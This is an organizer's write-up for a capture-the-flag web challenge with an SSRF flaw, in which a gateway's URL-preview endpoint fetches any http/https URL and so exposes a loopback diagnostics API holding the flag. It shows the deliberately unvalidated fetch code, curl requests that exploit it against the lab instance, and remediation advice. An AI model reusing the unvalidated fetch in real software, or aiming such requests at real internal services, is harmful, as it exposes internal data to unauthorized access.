# WEB-05 — Organizer Writeup: The Internal Gateway

## 1. Challenge overview

| | |
|---|---|
| Name | The Internal Gateway |
| Category | Web |
| Difficulty / points | Hard / 300 |
| Vulnerability | Response-based SSRF (unrestricted outbound URL fetch) |
| Flag source | GZ::CTF dynamic flag (`GZCTF_FLAG`) |
| Guidance | Guided — three staged hints |
| Expected solve time | 35–50 minutes |

Meridian Technologies exposes an **Integration Console** that previews remote
endpoints on the user's behalf. The preview is executed by the gateway process,
returns the upstream status, headers and body, and has no destination
allowlist. Behind it, inside the same container, an unreleased *Operations
Diagnostics* service answers on `127.0.0.1:9000` and stores the per-team flag in
a RESTRICTED record.

## 2. Application architecture

```text
participant browser
        |  GET / , /api/integrations , POST /api/integrations/preview
        v
gateway  (Express, 0.0.0.0:3000)      <- receives GZCTF_FLAG?  NO
        |  fetch(target)  (http/https, GET, 3 s, 64 KiB, no redirects)
        v
internal diagnostics API (node:http, 127.0.0.1:9000)  <- holds GZCTF_FLAG
```

Gateway routes:

| Method | Path | Purpose |
|---|---|---|
| GET | `/` | Portal shell |
| GET | `/assets/app.js` | Portal bundle |
| GET | `/api/integrations` | Connector catalogue |
| GET | `/api/status` | Gateway self-report |
| GET | `/health` | Liveness |
| POST | `/api/integrations/preview` | **Vulnerable** preview endpoint |

Internal routes:

| Method | Path | Purpose |
|---|---|---|
| GET | `/internal/health` | Health probe used by the entrypoint |
| GET | `/internal/services` | Service catalogue (discovery step) |
| GET | `/internal/diagnostics/record` | RESTRICTED record containing the flag |

## 3. Deployment topology (verified)

GZ::CTF 1.9.1 does **not** support multiple containers per dynamic challenge.
`ContainerConfig` carries a single `Image` and a single `ExposedPort`
(`src/GZCTF/Models/Internal/ContainerConfig.cs`) and `ChallengeType` has no
multi-container variant (`src/GZCTF/Utils/Enums.cs`). The challenge therefore
implements the documented **fallback**: one container, two supervised processes,
with the internal listener bound to loopback.

Verification evidence (local, executed):

* only one port is published per instance (`docker port` returns one mapping);
* `docker port <container> 9000/tcp` returns nothing;
* a second container on the same Docker network cannot reach
  `http://<challenge-ip>:9000/internal/health`;
* the gateway process environment contains no `GZCTF_FLAG`, while the internal
  process environment does (checked through `/proc/<pid>/environ`).

## 4. Intended vulnerability

`POST /api/integrations/preview` passes the user-supplied URL directly to
`fetch()`:

```js
// source/gateway/lib/fetch-target.js
const response = await fetch(target.href, {
  method: 'GET',
  redirect: 'manual',
  signal: controller.signal,
  ...
});
```

`target` is only validated as *an absolute http/https URL*. There is no
destination allowlist, no loopback/private-range block and no egress policy, so
the gateway — which shares a network namespace with the internal service — will
happily fetch `http://127.0.0.1:9000/...` and relay the response.

The impact is bounded deliberately so the container cannot be used as a general
network scanner or file reader:

* only `GET`;
* `http:`/`https:` only (`file:`, `gopher:`, `dict:` rejected with HTTP 400);
* 3 s timeout, 64 KiB response cap, `redirect: 'manual'`;
* response headers filtered through an allowlist (`set-cookie` and unknown
  `x-*` headers are dropped);
* errors are generic (`request_failed` + socket error code), never stack traces.

## 5. Intended solve path

1. **Open the portal.** The Integrations table lists four connectors. The third,
   *Local Diagnostics Probe*, is `kind: internal` and points at
   `http://127.0.0.1:9000/internal/health`, with the note that browsers report
   `ERR_CONNECTION_REFUSED` because previews run on the gateway.
2. **Recognise server-side execution.** Submitting that endpoint through the
   preview panel returns `HTTP 200` even though the browser itself cannot reach
   `127.0.0.1:9000`. That is the SSRF signal.
3. **Enumerate the internal service.** Preview
   `http://127.0.0.1:9000/internal/services`. The JSON catalogue lists
   `diagnostics` with `basePath: /internal/diagnostics`,
   `capabilities: ["record-export"]` and `record: MD-OPS-204`.
4. **Fetch the restricted record.** Preview
   `http://127.0.0.1:9000/internal/diagnostics/record`.
5. **Extract the flag** from `record.verification_token` and submit it.

## 6. Verified working request sequence

All responses below were captured from a locally built image
(`AXUM{local_test_flag}` substituted for the per-team value).

**Step 1 — discovery through the public catalogue**

```console
$ curl -s http://127.0.0.1:3301/api/integrations | jq -r '.integrations[] | select(.kind=="internal") | .endpoint'
http://127.0.0.1:9000/internal/health
```

**Step 2 — prove server-side execution**

```console
$ curl -s -X POST http://127.0.0.1:3301/api/integrations/preview \
    -H 'Content-Type: application/json' \
    -d '{"url":"http://127.0.0.1:9000/internal/health"}' | jq '{status, durationMs, body}'
{
  "status": 200,
  "durationMs": 2,
  "body": "{\"status\":\"ok\",\"service\":\"meridian-internal-diagnostics\",...}"
}
```

**Step 3 — enumerate internal services**

```console
$ curl -s -X POST http://127.0.0.1:3301/api/integrations/preview \
    -H 'Content-Type: application/json' \
    -d '{"url":"http://127.0.0.1:9000/internal/services"}' \
  | jq -r '.body' | jq '.services[] | select(.id=="diagnostics")'
{
  "id": "diagnostics",
  "name": "Operations Diagnostics",
  "classification": "RESTRICTED",
  "basePath": "/internal/diagnostics",
  "capabilities": ["record-export"],
  "record": "MD-OPS-204",
  "notes": "Record export is unauthenticated on the internal network."
}
```

**Step 4 — retrieve the record with the flag**

```console
$ curl -s -X POST http://127.0.0.1:3301/api/integrations/preview \
    -H 'Content-Type: application/json' \
    -d '{"url":"http://127.0.0.1:9000/internal/diagnostics/record"}' \
  | jq -r '.body' | jq '.record.verification_token'
"AXUM{internal_gateway_<12 hex>}"
```

Redacted response shape:

```json
{
  "success": true,
  "target": "http://127.0.0.1:9000/internal/diagnostics/record",
  "status": 200,
  "headers": {
    "cache-control": "no-store",
    "content-length": "335",
    "content-type": "application/json; charset=utf-8",
    "date": "...",
    "x-content-type-options": "nosniff"
  },
  "body": "{\"service\":\"meridian-internal-diagnostics\",\"record\":{\"id\":\"MD-OPS-204\",\"classification\":\"RESTRICTED\",\"description\":\"Internal diagnostics verification record\",\"environment\":\"meridian-int-01\",\"reviewer\":\"Platform Reliability\",\"reviewedAt\":\"2026-10-28T04:12:00Z\",\"checksum\":\"a1c9f0e37b5d4c26\",\"verification_token\":\"AXUM{internal_gateway_<redacted>}\"}}",
  "truncated": false,
  "durationMs": 3
}
```

## 7. Root cause

The service treats a user-controlled string as the *destination* of a
server-side request and validates only its syntax. Server-side code runs with a
different network position than the client: it can reach loopback, private
ranges and link-local metadata endpoints. Because the internal diagnostics API
trusts anyone who can reach it ("unauthenticated on the internal network"), a
single unrestricted fetch is enough to read a RESTRICTED record.

## 8. Remediation (for the debrief)

1. **Allowlist destinations** — resolve the URL and require the host to match an
   approved integration registry, after DNS resolution.
2. **Block non-public address space** — reject loopback, RFC1918, link-local
   (`169.254.0.0/16`, `fd00:ec2::254`), unique-local and multicast targets;
   re-check after every redirect.
3. **Disable redirects, or re-validate each hop** — the current code already
   refuses to follow redirects.
4. **Egress filtering** — run the fetcher in a network segment that cannot reach
   internal management services.
5. **Do not trust the internal network** — the diagnostics API should require
   authentication and authorization instead of relying on network position.
6. **Do not reflect raw upstream bodies** to clients; return a parsed, typed
   subset instead of arbitrary text.

## 9. Common failure modes

| Symptom | Cause |
|---|---|
| Preview of `127.0.0.1:9000` returns `request_failed` with `ECONNREFUSED` | The internal process is not up; check the container logs for `[entrypoint] internal diagnostics service is ready`. |
| Preview returns `504` | Upstream took longer than the 3000 ms gateway timeout. |
| Preview body ends abruptly with `truncated: true` | Upstream exceeded the 64 KiB cap. |
| Participant cannot find port 9000 | The integration catalogue entry was edited or removed; restore `/api/integrations`. |
| Container exits immediately | `GZCTF_FLAG` was not injected — confirm the challenge is `DynamicContainer`. |
| Flag accepted for one team but not another | Expected: each container receives its own `GZCTF_FLAG`; cross-team flags are rejected by GZ::CTF. |
